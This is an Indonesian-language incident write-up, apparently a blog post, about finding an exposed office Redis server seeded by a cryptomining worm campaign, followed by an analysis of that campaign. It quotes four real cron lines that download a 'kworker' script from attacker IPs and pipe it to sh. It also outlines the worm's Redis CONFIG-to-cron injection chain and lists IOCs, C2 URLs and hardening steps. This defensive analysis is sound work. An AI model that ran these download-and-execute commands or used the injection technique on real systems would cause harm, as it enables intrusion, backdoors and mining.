# Waktu Redis Kantor Kecemplung ke Kampanye Malware (Cerita dari Lapangan)

Cerita ini dimulai dari hal yang sebenarnya biasa aja: **ngecek aset**, lihat-lihat konfigurasi, terus ngerasa ada yang “nggak pas”. Singkatnya, saya nemu **Redis server kantor yang-open** (missconfig), dan isinya malah mengarah ke indikasi bahwa server tersebut telah ter-compromised

---

## Kronologinya, dari awal

### 1. Nemu Redis yang kebuka

Seperti biasa sebagai seorang yang bekerja sebagai Security Analyst saya iseng iseng mengecek satu satu server kantor (karena saya percaya bahwa pasti ada blind spot meskipun seharusnya semua sudah tercatat di SIEM).

Dari kegaiatan inilah saya bertemu dengan salah satu server yang terdapat redis yang kebetulan juga missconfig

Redis itu kan enak buat cache, queue, apa pun. Tapi begitu ke-expose tanpa perlindungan yang setara DB “beneran”, secara praktis lo udah kasih **remote console** ke siapa pun yang bisa reach port **6379**.

### 2. Iseng `KEYS *`—eh, kok aneh?

Ya, saya tahu di produksi `KEYS *` itu **nggak disarankan** (bisa blocking). Tapi di konteks investigasi cepat, kadang ya gitu dulu biar kelihatan gambaran besar.

Yang keluar **bukan** key session, cache user, atau pattern aplikasi. Yang ada cuma empat key dengan nama yang terlalu “rapi” buat kebetulan:

```text
1x.x.x.x:6379> KEYS *
1) "backup3"
2) "backup1"
3) "backup4"
4) "backup2"
```

Di kepala langsung muncul insting kecil: **siapa yang nyimpen “backup” di Redis dengan nama generik gitu?** Biasanya tim app kasih prefix, namespace, atau TTL. sangat SUS wkwk.

### 3. `GET` satu-satu—baru deh “wow”

Pas di-`GET`, isinya **bukan JSON**, bukan string bisnis—malah **baris cron** yang nyuruh sistem **download skrip** terus **jalanin pakai shell**.

```text
103.89.124.196:6379> GET backup1
"\n\n\n*/2 * * * * root cd1 -fsSL http://34.70.205.211/plugins-dist/safehtml/lang/font/kworker | sh\n\n"

103.89.124.196:6379> GET backup2
"\n\n\n*/3 * * * * root wget -q -O- http://34.70.205.211/plugins-dist/safehtml/lang/font/kworker | sh\n\n"

103.89.124.196:6379> GET backup3
"\n\n\n*/4 * * * * root curl -fsSL http://38.150.0.118/dewfhuewr4r89/98hy67//kworker | sh\n\n"

103.89.124.196:6379> GET backup4
"\n\n\n*/5 * * * * root wd1 -q -O- http://34.70.205.211/plugins-dist/safehtml/lang/font/kworker | sh\n\n"
```

Jadi intinya:

- **`backup1`–`backup4`** itu **bukan backup data**—itu **empat variasi untuk download**: `cd1`, `wget`, `curl`, `wd1` (dua yang terakhir itu sering alias hasil rename `curl`/`wget` di campaign malware biar skrip mereka tetap jalan meski path asli udah diutak-atik).
- Jadwalnya beda menit (`*/2`, `*/3`, …) biar **kalau satu gagal, yang lain masih nyoba**. Redundansi buat penyerang, buat kita berarti **lebih banyak noise** di cron kalau sempat ke-tulis ke disk.
- URL-nya nunjuk ke skrip bernama **`kworker`**—nama yang sengaja **mirip thread kernel** biar di `ps` keliatan “wajar” kalau orang cuma lihat sekilas.

Ini pola yang umum di campaign yang memanfaatkan **Redis missconfig**: mereka isi database dengan string yang **siap ditulis** ke lokasi cron lewat trik `CONFIG` + persistensi (intinya: **tulis file palsu yang isinya cron**). Key `backup*` di sini cuma **wadah data**; yang bahaya adalah **rangkaian perintah** yang pernah atau akan dieksekusi di mesin korban.


---

## Kenapa ini bisa kejadian?

Tanpa ngulang kuliah, versi santainya gini:

- Redis **bukan** “cuma cache ringan”—kalau orang bisa kontrol isi dan (lebih parah lagi) **konfigurasi**-nya, mereka bisa main **tulis ke filesystem** dalam skenario tertentu.
- Banyak deployment masih **tanpa password kuat**, **bind ke 0.0.0.0**, dan **`CONFIG` masih hidup**. Itu resep klasik buat bot scan port 6379 sambil senyum.

Jadi ini bukan “Redis jelek”—ini **Redis + kurang hardening + asumsi jaringan aman**.

---

## Di balik `backup1`–`backup4`: ini satu campaign, bukan “script iseng”

Setelah insiden, saya cocokin pola di Redis dengan **analisis statis** terhadap artefak kampanye yang sama (`kworker`, `cb.txt`, `cr.sh`). Intinya: key `backup*` yang saya lihat **bukan kebetulan**—itu **cocok banget** dengan isi skrip worm **`cr.sh`**, yang nyimpen string cron di key palsu lalu mem-pipe perintah Redis ke ribuan host terbuka lewat `redis-cli`.

**Alur besar (kill chain) versi ngobrol:**

1. **Infeksi awal** — biasanya lewat cron/SSH/server lain yang udah kena.
2. **`kworker`** jalan — bikin host “bersih” dari miner orang lain, pasang backdoor SSH, cron, unduh miner **`javae`**, terus panggil stage berikutnya.
3. **`cb.txt`** — stager yang nginstall **Redis client**, **masscan**, **pnscan** (bisa dari tarball di C2), kill proses pesaing, lalu unduh & jalanin **`cr.sh`**.
4. **`cr.sh`** — scan massal port **6379**, kirim file **`.dat`** (isinya perintah Redis kayak `CONFIG SET dir` ke folder cron, `SAVE`, dll.) ke setiap Redis ketemu. String di key **`backup1`…`backup4`** itu **persis bahan mentah** yang mau ditulis ke disk sebagai cron—makanya di instance kantor key-nya masih kebaca utuh kalau serangan/seeding-nya sempat berhenti di tengah atau Redis dipakai sebagai “tempat naruh payload” sebelum `SAVE`.

**Peran tiap file (supaya gambaran utuh):**

| File | Fungsi kasar |
|------|----------------|
| **`kworker`** | Orkestrator: matiin firewall/SELinux/AppArmor sekenanya, uninstall agen cloud (Aegis, YunJing, dll.), aliasing `curl`→`cd1` / `wget`→`wd1`, kill miner kompetitor, persistensi, **wrap** `ps`/`top`/`pstree` biar `javae` & `pnscan` nggak keliatan, SSH key penyerang, unduh **`javae`** (~5,6 MB), lalu **`cb.txt`** \| bash. Ada juga lateral SSH ke host di `known_hosts` (C2 lain). |
| **`cb.txt`** | Kerja di `/tmp/.ice-unix/...` + file **`.watch`**; install paket via `apt`/`yum`; unduh **masscan** / **pnscan** kalau belum ada; akhirnya **`cr.sh`** \| bash. |
| **`cr.sh`** | Worm Redis: bikin **`.dat`**, isi dengan chain perintah (termasuk `flushall`, set `stop-writes-on-bgsave-error no`, lalu isi key palsu dengan **string cron**—nama key-nya memang **`backup1`–`backup4`**), terus `cat .dat \| redis-cli -h … -p …` ke banyak target. Scan pakai **pnscan** + **masscan** (internet, range privat, LAN dari `ip a`). Kalau `pnscan` udah jalan, skrip cuma ngasih pesan **`root runing.....`** biar nabrak instansi sendiri. |

**Korelasi yang penting buat tim SOC:** `kworker` **nyembunyiin `pnscan` di output `ps`**, sementara `cr.sh` **sengaja pakai `/bin/ps.original`** kalau ada—biar cek “udah ada pnscan belum” nggak ketipu wrapper. Itu tanda **satu aktor** ngerancang rangkaian ini.

**CVE?** Bukan satu CVE keren—lebih ke **Redis exposed + tanpa auth + `CONFIG` hidup** = *misconfiguration* yang dieksploitasi sebagai *remote service abuse*.

---

## MITRE ATT&CK (versi ringkas)

| Taktik | Contoh yang relevan di kampanye ini |
|--------|--------------------------------------|
| Execution | Shell, `curl … \| bash` |
| Persistence | Cron, manipulasi `authorized_keys` |
| Defense Evasion | Matiin tool/log, filter `ps`/`top`, `chattr +i` |
| Discovery | Scan port, `ip a` buat LAN |
| Lateral Movement | Redis, SSH dari `known_hosts` |
| Impact | Mining (`javae`), `FLUSHALL` ke Redis korban, beban scan |

---

## Dampak kalau dibiarin (diluar “server panas”)

- **Data Redis** bisa kehapus (`flushall` di chain perintah worm).
- **Backdoor admin** lewat SSH + cron yang dikunci `chattr`.
- **Reputasi / compliance:** IP kantor jadi sumber scan ke port 6379 dunia dan host lain.
- **Biaya:** IR, rebuild, audit seluruh subnet yang pernah punya Redis kebuka.

---

## Apa yang saya pelajari dari case ini

1. **Kalau lihat key aneh dengan nama generik** (`backup1`, `backup2`, …) dan isinya + `* * * * *` + `curl`/`wget`/`sh`—jangan dibuka tab URL-nya di laptop kerja buat “iseng”; anggap **IOC** dan ikut prosedur IR.
2. **Cek cron di OS** host yang menjalankan Redis itu, cek juga `/etc/cron.d/`, `/var/spool/cron/`, integritas file—karena key itu bisa jadi **bekas percobaan** atau bagian dari chain yang belum/selesai.
3. **Implementasi Auth Redis**: auth/ACL, bind ke localhost atau segment internal saja, firewall ketat.
4. **Matikan atau rename** perintah sensitif kayak `CONFIG` kalau memang nggak butuh di produksi.
5. Setelah kejadian gini, **jangan cuma “hapus key” terus move on**—tanya: **siapa** yang pernah connect, **dari mana**, apakah ada **host lain** di subnet yang kena pola sama.

**Tambahan dari analisis lengkap (checklist IR):** isolasi host, anggap key SSH & kredensial di mesin itu **compromised**, audit `authorized_keys` di infra terkait, blok IOC di perimeter, cek artefak `/etc/kworker`, `/etc/javae`, wrapper `/bin/ps`, `/bin/top`, `/bin/pstree`, `/etc/cron.d/javae`, dan **prefer rebuild bersih** kalau sudah sempat jalanin dropper. Untuk pencegahan jangka panjang: `rename-command CONFIG ""` kalau memungkinkan, bind Redis ketat, TLS + auth.

---

## Daftar IOC (Indikator Kompromi)

Buat dimasukin ke SIEM, firewall, atau threat intel internal. **Jangan** dijadikan target buat “ngetes” aktif ke infrastruktur orang—cukup buat **deteksi & blokir** di lingkungan sendiri.

### Analisis sandbox (ANY.RUN)

Sampel skrip `kworker` yang diuji di sandbox **ANY.RUN** (Ubuntu 22.04, verdict *Malicious activity* — backdoor / coinminer / botnet-related behavior). Laporan interaktif:

- [ANY.RUN — report `kworker` (SHA256 + task)](https://any.run/report/92a71778310bf37cf81c8f42a250ea7b9ed17042b577d90f5d179f90ac1c056a/f0bdb5d6-1082-4fd1-b815-0f9bc3e34892)
- [ANY.RUN — task langsung](https://app.any.run/tasks/f0bdb5d6-1082-4fd1-b815-0f9bc3e34892)

Di situ bisa dilihat proses, file yang ditulis (mis. `authorized_keys`, cron, `javae`), dan request HTTP ke C2.

### Hash file — skrip `kworker` (sampel yang sama dengan di ANY.RUN)

| Algoritma | Hash |
|-----------|------|
| **MD5** | `FEA52AB0CC2717301B0E197BBFEC894F` |
| **SHA1** | `A5E71A9889FD8EE32175B064238AC1731E310A8F` |
| **SHA256** | `92A71778310BF37CF81C8F42A250EA7B9ED17042B577D90F5D179F90AC1C056A` |
| **ssdeep** | `768:vxlT2wDuWvWi7uDcFHcbSRlIniRULz/Ql/+9V:wHDEcbSciI19V` |

**Catatan:** hash ini untuk **satu varian** skrip `kworker` yang di-submit ke ANY.RUN. Varian lain (beda byte satu aja) bakal beda SHA256—tetap pakai pola URL, key Redis, dan perilaku di atas buat deteksi yang lebih tahan lama.

### Jaringan (IP & URL)

| Tipe | Nilai | Keterangan singkat |
|------|--------|---------------------|
| IP | `34.70.205.211` | C2 utama; path sering `/plugins-dist/safehtml/lang/font/...` |
| IP | `38.150.0.118` | C2 alternatif (muncul di string `backup3` / variasi cron) |
| IP | `38.150.0.136` | C2 untuk propagasi lateral via SSH (sering di skrip dropper) |
| URL | `http://34.70.205.211/plugins-dist/safehtml/lang/font/kworker` | Skrip dropper / persistensi |
| URL | `http://34.70.205.211/plugins-dist/safehtml/lang/font/javae` | Biner miner / loader (~5,6 MB) |
| URL | `http://34.70.205.211/plugins-dist/safehtml/lang/font/cb.txt` | Stager (pasang masscan, pnscan, Redis tools) |
| URL | `http://34.70.205.211/plugins-dist/safehtml/lang/font/cr.sh` | Worm Redis → injeksi cron |
| URL | `http://34.70.205.211/plugins-dist/safehtml/lang/font/1.0.5.tar.gz` | Tarball masscan |
| URL | `http://34.70.205.211/plugins-dist/safehtml/lang/font/pnscan-1.14.1.tar.gz` | Tarball pnscan |
| URL | `http://38.150.0.118/dewfhuewr4r89/98hy67//kworker` | Varian path (perhatikan `//` di URL) |
| URL | `http://38.150.0.136/dewfhuewr4r89/98hy67/kworker` | Payload untuk perintah jarak jauh SSH |

**Pola path yang bisa dipakai aturan IDS/Suricata:** `*/plugins-dist/safehtml/lang/font/*`

### Redis (key & isi)

| Tipe | Nilai | Catatan |
|------|--------|---------|
| Key | `backup1`, `backup2`, `backup3`, `backup4` | Bukan data backup; isi string berisi baris cron + download |
| Pola isi | `*/2 * * * *` … `*/5 * * * *` + `kworker` + `\| sh` | Redundansi jadwal & multi-klien (`cd1`, `wget`, `curl`, `wd1`) |

### Host / berkas & nama proses

| Tipe | Nilai |
|------|--------|
| Skrip / biner | `kworker`, `javae` |
| Nama palsu / alias | `cd1` (sering salinan/rename `curl`), `wd1` (sering `wget`) |
| Path persistensi (umum di kampanye ini) | `/etc/kworker`, `/etc/javae`, `/tmp/kworker`, `/tmp/javae`, `/etc/cron.d/javae` |
| Direktori kerja stager | `/tmp/.ice-unix/...` |
| Tool scanning | `masscan`, `pnscan` (muncul bersamaan dengan abuse Redis) |
| Modifikasi evasi | `/bin/ps.original`, `/bin/top.original`, `/bin/pstree.original` (ada biner asli yang di-backup) |
| Artefak sementara worm | `.dat`, `.shard`, `.ranges`, `.lan`, `.r.*` (dibuat `cr.sh` saat scan / serangan Redis) |

### Perilaku (pola deteksi, melengkapi hash)

- Koneksi **keluar** ke kombinasi IP di atas + path `plugins-dist` / `dewfhuewr4r89`.
- **Scan masuk** massal ke `6379/tcp` dari internet ke aset Anda.
- `redis-cli` atau proses aneh yang **membombardir** banyak IP:6379 dari satu host.
- Cron baru berisi `curl`/`wget`/`cd1`/`wd1` + pipe ke `sh`/`bash` + domain/IP di tabel di atas.

Untuk artefak di disk kantor (mis. `javae`, `cb.txt`, `cr.sh`), **hitung SHA256 sendiri** dari salinan karantina dan tambahkan ke ticket IR—ukuran/isi bisa beda antar varian.

**Batasan (jujur dari laporan teknis):** analisis lengkap di repo saya itu **statis** (isi skrip teks); biner **`javae`** belum di-reverse mendalam. Varian `cb.txt` bisa beda perilaku kalau cabang `cd1` error sintaks—tetap pantau perilaku runtime di SIEM.

---

## Dokumentasi analisis lengkap

Kalau butuh versi formal (per file, IOC terpadu, rekomendasi IR panjang, diagram alur): lihat laporan Markdown di repo yang sama:

- [`LAPORAN_ANALISA_LENGKAP.md`](2026-04-12-laporan-lengkap.md) — analisis gabungan `kworker`, `cb.txt`, dan `cr.sh` (tanggal analisis: 12 April 2026).

---

## Penutup

Jadi gitu ceritanya: dari **“cuma cek Redis”** bisa nyungsep ke **“ini sisa malware campaign”** dalam beberapa menit. Yang bikin merinding itu bukan output `GET`-nya sendiri—tapi sadar **kalau ini kejadian di aset kantor**, berarti ada celah proses (deployment, review firewall, atau asumsi “internal aman”) yang perlu ditutup.

Redis tetap alat yang keren. Yang perlu dijaga **adalah eksposur dan permission-nya**—supaya lain kali yang iseng `KEYS *` cuma nemu cache promo flash sale, bukan empat “backup” yang nyuruh server unduh `kworker`.

---

*Tulisan ini untuk berbagi pengalaman & edukasi; bagian rantai kampanye dan IOC melengkapi catatan di [`LAPORAN_ANALISA_LENGKAP.md`](2026-04-12-laporan-lengkap.md). URL dan IP di contoh berasal dari insiden / sampel analisis; gunakan sebagai referensi pola, bukan undangan buat nge-test exploit ke sistem orang.*

**Tag:** `#redis` `#malware` `#incidentresponse` `#threatintel` `#sysadminlife` `#infosec`
